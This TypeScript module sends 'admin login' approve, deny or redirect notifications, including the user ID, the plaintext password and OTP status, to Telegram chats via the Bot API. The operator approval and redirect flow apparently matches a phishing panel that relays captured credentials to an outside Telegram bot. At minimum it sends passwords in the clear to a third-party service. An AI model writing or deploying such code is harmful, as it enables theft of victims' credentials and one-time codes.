import {
  buildAdminLoginApprovedBody,
  buildAdminLoginDeniedBody,
  buildAdminLoginRedirectedBody,
} from '@/lib/telegram-approval-templates'
import { wrapFlowMessage } from '@/lib/telegram'

const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
  .split(/[,;\n]+/)
  .map((id) => id.trim())
  .filter(Boolean)

export type AdminLoginOutcomeAction = 'approve' | 'deny' | 'redirect'
export type AdminRequestKind = 'login' | 'otp'

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function asCode(value: unknown): string {
  const text =
    typeof value === 'string'
      ? value.trim()
      : value != null && value !== ''
        ? String(value)
        : ''
  return `<code>${escapeHtml(text || 'Unknown')}</code>`
}

async function sendTelegramMessage(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || CHAT_IDS.length === 0) return false
  const results = await Promise.all(
    CHAT_IDS.map(async (chatId) => {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      })
      const data = await res.json().catch(() => ({}))
      return res.ok && data?.ok === true
    }),
  )
  return results.some(Boolean)
}

export async function sendAdminLoginOutcomeNotification(data: {
  action: AdminLoginOutcomeAction
  requestKind?: AdminRequestKind
  userId?: string
  password?: string
  method?: 'email' | 'text' | string
}): Promise<boolean> {
  const isOtp = data.requestKind === 'otp'
  const builderData = {
    userId: data.userId,
    password: data.password,
    method: data.method,
    asCode,
    isOtp,
  }

  let message: string
  if (data.action === 'approve') {
    message = buildAdminLoginApprovedBody(builderData)
  } else if (data.action === 'deny') {
    message = buildAdminLoginDeniedBody(builderData)
  } else {
    message = buildAdminLoginRedirectedBody(builderData)
  }

  return sendTelegramMessage(wrapFlowMessage(message))
}
